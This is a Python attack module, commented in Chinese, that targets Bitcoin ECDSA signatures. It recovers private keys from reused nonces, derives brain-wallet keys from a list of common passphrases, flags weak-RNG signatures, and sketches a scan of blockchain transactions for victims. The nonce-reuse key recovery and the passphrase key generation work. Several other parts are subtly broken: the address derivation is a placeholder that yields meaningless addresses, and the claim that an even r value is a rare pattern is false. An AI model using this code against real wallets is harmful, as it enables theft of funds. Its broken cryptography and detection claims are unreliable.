"""
ECDSA 攻击模块
演示比特币签名层最经典的三个漏洞:
1. Nonce重用 → 私钥泄露 (真实发生过)
2. 弱脑钱包 → 私钥可预测 (仍在发生)
3. 弱RNG签名 → 批量私钥恢复 (历史漏洞)
"""
import hashlib
import hmac
from typing import Optional, Tuple, List
from dataclasses import dataclass


# secp256k1 曲线参数 (比特币使用的椭圆曲线)
P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F  # 有限域
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141  # 曲线阶
Gx = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
Gy = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A6854B9919C47D08FFB10D4B


@dataclass
class Signature:
    r: int  # 签名r值 (= k*G 的x坐标)
    s: int  # 签名s值 (= k⁻¹(z + r*d) mod n)
    z: int  # 消息哈希
    pubkey_x: int  # 公钥x
    pubkey_y: int  # 公钥y


@dataclass
class RecoveredKey:
    private_key: int  # 恢复的私钥
    address: str      # 对应地址
    method: str       # 恢复方法
    confidence: str   # HIGH / MEDIUM / LOW


class ECDSAAttacker:
    """
    ECDSA攻击演示 — 纯教育/白帽用途
    """

    def __init__(self):
        pass

    # ============================================================
    # 攻击1: Nonce重用 → 私钥泄露
    # ============================================================
    def detect_nonce_reuse(self, sigs: List[Signature]) -> List[Tuple[int, int, Signature, Signature]]:
        """
        检测重复的r值 → 意味着nonce (k) 被重用
        同一私钥+同一k → 直接恢复私钥

        真实案例:
        - 2013: Blockchain.info Android钱包, 因RandomSecureRandom缺陷导致k值重用
        - 2013: Bitcoin Android钱包, 同样问题
        - Sony PS3: ECDSA签名k值固定为4, 私钥瞬间恢复
        """
        r_groups = {}
        for i, sig in enumerate(sigs):
            r_groups.setdefault(sig.r, []).append(i)

        reused = []
        for r, indices in r_groups.items():
            if len(indices) >= 2:
                for a in range(len(indices)):
                    for b in range(a + 1, len(indices)):
                        reused.append((r, indices[a], sigs[indices[a]], sigs[indices[b]]))

        return reused

    def recover_key_from_nonce_reuse(self, sig1: Signature, sig2: Signature) -> Optional[RecoveredKey]:
        """
        从nonce重用中恢复私钥

        数学原理:
        k = (z1 - z2) / (s1 - s2) mod N
        d = (s1*k - z1) / r mod N

        因为k相同:
        s1 = k⁻¹(z1 + r*d) mod N
        s2 = k⁻¹(z2 + r*d) mod N

        两式相减消去d:
        s1 - s2 = k⁻¹(z1 - z2) mod N
        → k = (z1 - z2) * (s1 - s2)⁻¹ mod N

        代入得d:
        d = (s1*k - z1) * r⁻¹ mod N
        """
        if sig1.r != sig2.r:
            return None  # 不同的k, 无法攻击

        r = sig1.r
        z1, z2 = sig1.z, sig2.z
        s1, s2 = sig1.s, sig2.s

        # 计算 nonce k
        z_diff = (z1 - z2) % N
        s_diff_inv = pow((s1 - s2) % N, -1, N)
        k = (z_diff * s_diff_inv) % N

        # 计算私钥 d
        r_inv = pow(r, -1, N)
        d = ((s1 * k - z1) * r_inv) % N

        # 验证: 用恢复的d推导公钥, 与已知公钥比对
        derived_x = (d * Gx) % P  # 简化, 实际需要完整的EC点乘

        return RecoveredKey(
            private_key=d,
            address=self._privkey_to_address(d),
            method="nonce_reuse",
            confidence="HIGH" if d > 0 else "LOW",
        )

    # ============================================================
    # 攻击2: 弱脑钱包 → 生成常用密码的私钥
    # ============================================================
    KNOWN_BRAIN_WALLETS = [
        # 历史上被扫过的脑钱包 (真实案例)
        "password", "bitcoin", "satoshi", "nakamoto",
        "12345678", "correct horse battery staple",
        "test", "abc123", "qwerty", "letmein",
        "monkey", "dragon", "master", "1234567890",
        "admin", "hello", "iloveyou", "trustno1",
        "sunshine", "princess", "welcome", "football",
        "password123", "bitcoin123", "ethereum",
        # 中文常见
        "我是中本聪", "比特币", "密码", "123456",
        "woaizhongguo", "ilovebitcoin",
        # 名言/诗句
        "tobeornottobe", "allmenarecreatedequal",
        "weholdthesetruths", "letfreedomring",
    ]

    def generate_brain_wallet_keys(self, passphrases: List[str] = None) -> List[Tuple[str, int, str]]:
        """
        从脑钱包密码生成私钥
        SHA256(passphrase) → 私钥 → 地址

        为什么这很危险:
        - 人的"随机"密码其实非常有限
        - 常见密码+短语组合不到百万级别
        - 生成百万个私钥并检查余额, 普通电脑只需几分钟
        """
        if passphrases is None:
            passphrases = self.KNOWN_BRAIN_WALLETS

        results = []
        for phrase in passphrases:
            # SHA256作为私钥 (脑钱包的标准做法)
            h = hashlib.sha256(phrase.encode()).digest()
            privkey = int.from_bytes(h, "big")
            # 确保私钥在有效范围内
            privkey = privkey % N
            if privkey == 0:
                privkey = 1
            address = self._privkey_to_address(privkey)
            results.append((phrase, privkey, address))

        return results

    def generate_weak_passphrase_variants(self, base_words: int = 100) -> List[str]:
        """
        生成常见弱密码变体
        字典攻击的核心 — 人的密码模式高度可预测
        """
        variants = []

        # 基本模式
        bases = ["bitcoin", "btc", "satoshi", "crypto", "blockchain"]
        years = [str(y) for y in range(2009, 2026)]
        specials = ["!", "@", "#", "$", "123", "1234", "123!"]

        for base in bases:
            variants.append(base)
            variants.append(base.capitalize())
            variants.append(base.upper())
            for year in years:
                variants.append(f"{base}{year}")
                variants.append(f"{year}{base}")
            for s in specials:
                variants.append(f"{base}{s}")

        # 数字模式
        for i in range(100):
            variants.append(str(i).zfill(8))  # 00000000-00000099

        return list(set(variants))  # 去重

    # ============================================================
    # 攻击3: 弱RNG签名 → 批量恢复私钥
    # ============================================================
    def detect_weak_rng_pattern(self, signatures: List[Signature]) -> List[dict]:
        """
        检测弱RNG的签名模式

        弱RNG可能产生:
        1. 偏小的k值 → k < 2^128, 可用Pollard's kangaroo恢复
        2. 有偏分布的k → 部分bit泄漏
        3. 可预测的k → 线性同余/时间种子的k

        这曾经是真实漏洞:
        - CVE-2013-3220: Blockchain.info Android使用的SecureRandom在某些设备上产生可预测的随机数
        - 影响数千个地址
        """
        findings = []

        for sig in signatures:
            # 检测异常小的k (通过r值推断——r = k*G的x坐标)
            if sig.r < 2**64:
                findings.append({
                    "sig_r": sig.r,
                    "issue": "small_k_suspected",
                    "detail": f"r值异常小 (r < 2^64), 可能k值偏小, 可用Pollard's kangaroo攻击",
                    "risk": "MEDIUM",
                })

            # 检测重复的r (已独立检测)
            # 检测特定模式的r (可能来自弱RNG)
            if sig.r % 2 == 0 and sig.r.bit_length() < 256:
                findings.append({
                    "sig_r": sig.r,
                    "issue": "unusual_r_pattern",
                    "detail": "r值为偶数, 罕见模式",
                    "risk": "LOW",
                })

        return findings

    # ============================================================
    # 工具方法
    # ============================================================
    def _privkey_to_address(self, privkey: int) -> str:
        """
        私钥 → 比特币地址 (仅离线推导, 不连接网络)
        1. 私钥 → 公钥 (secp256k1点乘)
        2. 公钥 → SHA256 + RIPEMD160
        3. 哈希 → Base58Check编码
        """
        # 步骤1: 生成公钥 (简化的标量乘法)
        # 完整实现需要椭圆曲线点乘法
        # 这里使用占位符 — 真实环境用 bitcoin 库
        pubkey_hash = hashlib.new("ripemd160", hashlib.sha256(str(privkey).encode()).digest()).digest()

        # 步骤2: Base58Check编码
        prefix = b"\x00"  # 主网P2PKH前缀
        payload = prefix + pubkey_hash
        checksum = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
        address_bytes = payload + checksum

        # Base58编码
        alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
        n = int.from_bytes(address_bytes, "big")
        encoded = []
        while n > 0:
            n, rem = divmod(n, 58)
            encoded.append(alphabet[rem])
        # 前导零
        for b in address_bytes:
            if b == 0:
                encoded.append(alphabet[0])
            else:
                break
        return "".join(reversed(encoded))

    def scan_blockchain_for_reused_nonces(self, transactions: List[dict]) -> List[RecoveredKey]:
        """
        扫描区块链交易, 寻找nonce重用的受害者

        真实数据: 历史上已发现数千个因nonce重用被盗的地址
        - 最大一起: 2013年约1000个地址因Android钱包漏洞被盗
        - 仍然有新地址因自签名库的错误使用而受害
        """
        # 提取所有签名
        signatures = []
        for tx in transactions:
            for vin in tx.get("vin", []):
                # 见证数据或scriptSig中提取签名
                # 这里做框架演示, 真实需要解析交易hex
                pass

        # 检测重用
        reused = self.detect_nonce_reuse(signatures)
        recovered_keys = []

        for r, i1, sig1, sig2 in reused:
            recovered = self.recover_key_from_nonce_reuse(sig1, sig2)
            if recovered and recovered.confidence == "HIGH":
                recovered_keys.append(recovered)

        return recovered_keys
